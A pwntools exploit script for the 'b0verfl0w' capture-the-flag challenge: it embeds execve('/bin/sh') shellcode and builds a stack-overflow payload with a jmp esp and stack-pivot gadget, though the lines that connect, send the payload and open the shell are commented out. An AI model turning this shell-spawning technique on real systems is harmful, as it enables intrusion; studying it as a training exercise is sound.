from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 26180
elfpath = './b0verfl0w'
libcpath = ''

# if args.LOCAL:
#     p = process([elfpath])
#     gdb.attach(p)
# else:
#     p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
shell = lambda: p.interactive()

# start pwning
sub_esp_0x24_ret = 0x8048500
jmp_esp = 0x8048504

shellcode_23bytes = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
print(disasm(shellcode_23bytes))

payload = b'a' * 4 + p32(jmp_esp) + shellcode_23bytes
payload = payload.ljust(0x20, b'a') + p32(0xdeadbeef)
payload += p32(sub_esp_0x24_ret)
# ru(b'What\'s your name?\n')
# sl(payload)

# shell()